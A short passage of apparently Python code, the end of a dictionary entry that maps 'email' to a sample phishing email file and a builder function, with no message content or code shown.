    'email': ('sample-phishing-email.eml', build_email_sample),
}
